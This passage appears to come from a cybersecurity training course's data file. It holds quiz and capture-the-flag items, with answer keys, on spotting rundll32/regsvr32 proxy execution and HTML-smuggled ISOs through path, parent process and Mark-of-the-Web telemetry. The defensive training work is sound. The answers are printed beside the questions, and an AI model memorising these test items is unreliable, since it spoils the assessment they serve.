        "fp_trap": "A student who has just worked through a malicious regsvr32.exe case with an unfamiliar-sounding function name is primed to treat any rundll32.exe or regsvr32.exe command line referencing a DLL and a named function as suspicious by pattern-matching on shape alone. That is exactly the overcorrection this room's detection reading warned about: the discriminator was never 'does this reference a DLL and a function' -- both benign and malicious cases do that identically. The discriminators are the path (a recognized deployment tool's own directory versus Temp/Downloads/an SMB share), the parent process (a known deployment agent versus explorer.exe or an Office application), and the absence of any remote URL or script-protocol argument -- all three of which resolve this case as benign.",
        "xp": 25
      },
      {
        "type": "question" as const,
        "id": "hsl-q4",
        "question": "You are investigating a host where rundll32.exe, launched by explorer.exe, proxy-executed a DLL from a mounted ISO a few minutes after the user opened an HTML email attachment. Per this room's detection reading, which telemetry most directly links the HTML-smuggled container's arrival to that later LOLBin execution, end to end?",
        "options": [
          "A file-creation event for the freshly written ISO carrying a Zone.Identifier alternate data stream with ZoneId=3, followed shortly on the same host by one of this room's LOLBin execution patterns",
          "The proxy or firewall log entry for the ISO download itself, since HTML Smuggling transfers the ISO across the network as a distinct file the gateway can inspect and hash",
          "An ISO with NO Zone.Identifier stream at all, since HTML Smuggling strips Mark-of-the-Web from the container at the moment the browser writes it to disk",
          "A failed Authenticode signature check on rundll32.exe, since a signed Windows binary loses its valid Microsoft signature once it proxy-executes attacker code"
        ],
        "answer": 0,
        "explanation": "This room's detection reading names exactly this as its fourth, cross-referenced tell: the file-creation event for an HTML-smuggled ISO or ZIP typically carries a Zone.Identifier stream with ZoneId=3 (downloaded from the internet), and seeing that artifact on a freshly created container followed shortly by a LOLBin pattern is a strong end-to-end correlation across both techniques. The gateway cannot hand you the ISO as a file: HTML Smuggling's whole point is that the payload is assembled from script inside the HTML in the browser and never crosses the network as a distinguishable file. Nor does it strip Mark-of-the-Web -- the room's HTML Smuggling reading stresses that the Zone.Identifier stream is applied when the browser writes the file and HTML Smuggling does not remove it; that is a separate technique (T1553.005) covered in the Commodity Initial-Access room. And rundll32.exe stays a validly signed Microsoft binary throughout -- that trusted signature is precisely why attackers proxy execution through it.",
        "xp": 25
      },
      {
        "type": "flag" as const,
        "id": "hsl-f1",
        "event": null,
        "prompt": "In this room’s regsvr32 log-analysis case on host LT-THN-4471, the command line fetched a COM scriptlet from a remote server. Enter the exact filename of that scriptlet as it appears in the URL.",
        "answer": "invoice_svc.sct",
        "hint": "Look back at the regsvr32 command line in that case: the scriptlet is the .sct file at the end of the http:// URL. Enter only the filename, not the full URL.",
        "xp": 15
      }
    ]
  }
];
